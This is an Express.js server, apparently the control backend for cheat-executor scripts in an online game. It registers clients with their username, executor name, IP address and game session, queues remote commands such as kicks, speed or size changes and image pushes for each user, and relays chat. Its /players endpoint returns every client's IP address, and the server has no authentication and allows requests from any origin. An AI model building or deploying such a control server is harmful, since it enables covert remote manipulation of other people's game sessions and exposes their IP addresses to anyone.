const express = require('express');
const cors = require('cors');
const path = require('path');

const app = express();
const PORT = process.env.PORT || 3000;

app.use(cors({
    origin: '*',
    methods: ['GET', 'POST', 'DELETE'],
    credentials: false
}));

app.use(express.json({ limit: '10mb' }));
app.use(express.static('public'));

// Base de données en mémoire
const players = new Map();
const commands = new Map();
const messages = new Map(); // Messages chat par joueur

// API pour enregistrement et heartbeat (optimisée)
app.post('/api', (req, res) => {
    const { action, userid, username, executor, ip, game, gameId, jobId } = req.body;

    if (action === 'register') {
        players.set(userid.toString(), {
            userid,
            username,
            executor,
            ip,
            game,
            gameId,
            jobId,
            lastSeen: Date.now(),
            status: 'online'
        });
        return res.json({ success: true });
    }

    if (action === 'heartbeat') {
        const player = players.get(userid.toString());
        if (player) {
            player.lastSeen = Date.now();
            player.status = 'online';
            return res.json({ success: true });
        }
        return res.json({ success: false });
    }

    res.json({ success: false });
});

// API pour récupérer les commandes (polling optimisé)
app.get('/api', (req, res) => {
    const { userid } = req.query;
    
    if (!userid) {
        return res.json({});
    }

    const command = commands.get(userid.toString());
    
    if (command) {
        commands.delete(userid.toString());
        return res.json(command);
    }

    res.json({});
});

// API pour envoyer des commandes
app.post('/command', (req, res) => {
    const { userid, command, reason, assetId, speed, size, color, text, imageUrl } = req.body;

    if (!userid || !command) {
        return res.status(400).json({ error: 'Missing data' });
    }

    const commandData = { command };
    if (reason) commandData.reason = reason;
    if (assetId) commandData.assetId = assetId;
    if (speed) commandData.speed = speed;
    if (size) commandData.size = size;
    if (color) commandData.color = color;
    if (text) commandData.text = text;
    if (imageUrl) commandData.imageUrl = imageUrl;

    commands.set(userid.toString(), commandData);
    res.json({ success: true });
});

// API chat - Envoyer un message
app.post('/chat', (req, res) => {
    const { userid, message, sender } = req.body;
    
    if (!userid || !message) {
        return res.status(400).json({ error: 'Missing data' });
    }

    if (!messages.has(userid.toString())) {
        messages.set(userid.toString(), []);
    }

    messages.get(userid.toString()).push({
        sender: sender || 'Admin',
        message,
        timestamp: Date.now()
    });

    res.json({ success: true });
});

// API chat - Récupérer les messages
app.get('/chat/:userid', (req, res) => {
    const { userid } = req.params;
    const userMessages = messages.get(userid.toString()) || [];
    res.json(userMessages);
});

// API pour obtenir la liste des joueurs (optimisée)
app.get('/players', (req, res) => {
    const now = Date.now();
    const playerList = Array.from(players.values()).map(player => ({
        ...player,
        status: (now - player.lastSeen < 15000) ? 'online' : 'offline'
    }));
    res.json(playerList);
});

// API pour supprimer un joueur
app.delete('/player/:userid', (req, res) => {
    const { userid } = req.params;
    players.delete(userid);
    commands.delete(userid);
    messages.delete(userid);
    res.json({ success: true });
});

// Nettoyage automatique
setInterval(() => {
    const now = Date.now();
    for (const [userid, player] of players.entries()) {
        if (now - player.lastSeen > 60000) {
            players.delete(userid);
            commands.delete(userid);
            messages.delete(userid);
        }
    }
}, 30000);

app.listen(PORT, () => {
    console.log(`🚀 Server running on port ${PORT}`);
});